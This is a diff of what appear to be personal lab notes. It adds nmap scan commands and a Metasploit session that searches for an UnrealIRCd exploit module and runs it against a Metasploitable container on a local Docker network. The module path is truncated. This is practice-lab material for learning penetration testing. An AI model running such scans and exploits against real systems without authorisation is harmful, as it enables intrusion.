@@ -8371,8 +8371,22 @@ ip a # inet 172.31.4.186/20 brd 172.31.15.255 scope global dynamic eth0
 ip a # inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
 # ping metasploitable from docker host
 ping 172.17.0.2 
+# os scan
 sudo nmap -O 172.17.0.2
+# ping scan
+sudo nmap -sn 172.17.0.2
+# port scan
+sudo nmap -Pn 172.17.0.2
+# tcp syn scan
+sudo nmap -PS 172.17.0.2
+```
 
+```
+msfconsole
+search unreal
+use exploit/unix/irc.......
+set rhosts 172.17.0.2
+run
 ```
 
 
